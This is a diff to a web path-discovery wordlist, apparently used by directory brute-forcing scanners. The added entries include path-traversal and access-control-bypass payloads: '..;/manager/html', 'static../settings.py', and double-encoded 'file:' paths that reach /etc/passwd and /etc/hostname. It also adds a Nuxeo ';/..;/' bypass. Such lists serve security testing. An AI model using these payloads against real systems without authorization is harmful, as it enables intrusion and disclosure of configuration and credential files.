@@ -6,7 +6,16 @@
 %3f/
 %EXT%
 %ff/
+%20/
 ..;/
+..;/manager/html
+..;/secure/ManageFilters.jspa
+..;/railo-context/admin/web.cfm
+static../views.py
+static../settings.py
+static../settings/90-local.conf
+static../templates/index.html
+file:%2f%2f/app/assets/images/%252e%252e/%252e%252e/%252e%252e/etc/passwd
 .7z
 .access
 .addressbook
@@ -105,6 +114,7 @@
 .filezilla/sitemanager.xml.xml
 .fishsrv.pl
 .flac
+.flag
 .flowconfig
 .fontconfig/
 .fontcustom-manifest.json
@@ -1930,6 +1940,8 @@ ASPSamp/AdvWorks/equipment/catalog_type.%EXT%
 aspwpadmin
 aspxspy.aspx
 assets
+assets/file:%2f%2f/app/assets/images/%252e%252e/%252e%252e/%252e%252e/etc/passwd
+assets/file:%2f%2f/app/assets/images/%252e%252e/%252e%252e/%252e%252e/etc/hostname
 assets/fckeditor
 assets/js/fckeditor
 assets/npm-debug.log
@@ -4259,6 +4271,9 @@ nucleus/documentation/history.html
 null
 null.htw
 nusoap
+nuxeo
+nuexo/login.jsp
+nuxeo/login.jsp;/..;/create_file.xhtml
 nwadmin
 nwp-content/plugins/disqus-comment-system/disqus.php
 o
@@ -4835,6 +4850,7 @@ radio
 radmin
 radmind-1/
 radmind/
+railo-context/admin/web.cfm
 Rakefile
 rap_admin
 rating_over.
